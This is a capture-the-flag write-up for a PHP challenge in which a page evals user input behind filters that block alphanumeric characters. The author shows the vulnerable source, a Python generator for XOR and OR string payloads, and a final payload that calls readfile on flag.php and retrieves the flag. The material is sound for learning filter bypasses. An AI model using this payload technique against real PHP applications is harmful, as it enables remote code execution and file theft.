# Junior PHP

## info

we were given an address... and nothing else...

opening it, we get this source code:
```php
 <?php
// flag's in flag.php
if (isset($_GET['x'])) {
    $x = $_GET['x'];

    if (preg_match('/[A-Za-z0-9]/', $x))
        die("no alphanumeric");
    if (preg_match('/\$|=/', $x))
        die("no php");
    if (strlen($x) >= 58)
        die("no");

    // yes
    eval($x);
} else {
    highlight_file(__FILE__);
}
```

it takes a GET parameter `x`, and then if its length is equal or less than 58, and doesn't contain alphanumeric and '$' or '=' characters... then evaluates it...

## solution

it's a tricky challenge... I don't know php that much, but my teammates do... one of them mentioned php allowes xor on strings...

and we had a lot of characters which hadn't been filtered... so... we could make things like `",;>;\\@,;" ^ "^^__:)@^"` which evaluates to `"readfile"`...

also something like `("readfile")("flag.php")` actually calls `readfile` method and passes `"flag.php"` as argument to it...

I wrote this script to easily convert my payload to an xor string:
```python
import sys
import string

s = [
    '"', "'", '!', '(', ')', '*', '+', ',', '-', '.', ':',
    '@', '[', ']', '^', '_', '{', '}', '~', '?', '#', '%',
    ' ', '<', '>', ';', '&', '`', '/', ','
]


def make_table():
    a = {}
    for x in s:
        for y in s:
            res = chr(ord(x) ^ ord(y))
            if res in string.printable:
                a[res] = a.get(res, []) + [(x, y)]

    return a


table = make_table()


def make_payload(s):
    a = ''
    b = ''

    for ch in s:
        x, y = table[ch][-1]

        a += x
        b += y

    return f'"{a}"^"{b}"'


if len(sys.argv) < 2:
    print(f"Usage:\n\t{sys.argv[0]} <payload>...")
    sys.exit(1)

for arg in sys.argv[1:]:
    p = make_payload(arg)
    print(len(p), p.encode())
```

although the '.' was lacking in the generated table... so I couldn't generate xor for `"flag.php"`...

after some time wandering around... I suddenly realized I'm totally missing the fact that if xor works, then bitwise or might also work! and it does!

so I generated xor string for `"readfile"` and `"php"`, then edited that script to use bitwise or instead of xor, and generated or string for `"flag."` part...

it's possible to concatenate '.' in between, but that would make the payload string too large...

final payload: `(",;>;\\@,;"^"^^__:)@^")(("`,``,"|"&`!\'&").("/@/"^"_(_"));`

```python
>>> import requests
>>> len('(",;>;\\@,;"^"^^__:)@^")(("`,``,"|"&`!\'&").("/@/"^"_(_"));')
57
>>> requests.get('http://junior-php.peykar.io', params={'x': '(",;>;\\@,;"^"^^__:)@^")(("`,``,"|"&`!\'&").("/@/"^"_(_"));'}).text
'<?php\n    $flag = "S4CTF{veRy_v3ry_very_e4sy_php}";\n'
>>> 
```
